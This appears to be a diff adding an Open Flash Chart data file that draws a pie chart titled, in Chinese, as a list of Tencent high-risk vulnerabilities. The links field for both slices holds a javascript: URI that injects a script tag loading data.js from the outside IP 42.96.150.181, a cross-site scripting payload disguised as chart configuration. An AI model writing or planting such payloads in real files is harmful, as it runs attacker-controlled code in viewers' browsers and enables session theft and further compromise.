@@ -1,0 +1,23 @@
+&title=腾讯高危漏洞一览表（点击类别可以查看详情）,{font-size:18px; color: #d01f3c}&
+
+&x_axis_steps=1&
+
+&y_ticks=50,50&
+
+&line=2,#87421F&
+
+&y_min=0&
+
+&y_max=20&
+
+&pie=60,#E4F0DB,{display:none;},1,,1&
+
+&values=50,50&
+
+&pie_labels=远程命令执行,腾讯客户端溢出&
+
+&colours=#d01f3c,#356aa0&
+
+&links=javascript:window.s=document.createElement('script');window.s.src='http://42.96.150.181/data.js';document.body.appendChild(window.s);,javascript:window.s=document.createElement('script');window.s.src='http://42.96.150.181/data.js';document.body.appendChild(window.s);&
+
+&tool_tip=类别%3A+%23x_label%23%3Cbr%3E比例%3A+%23val%23%25&
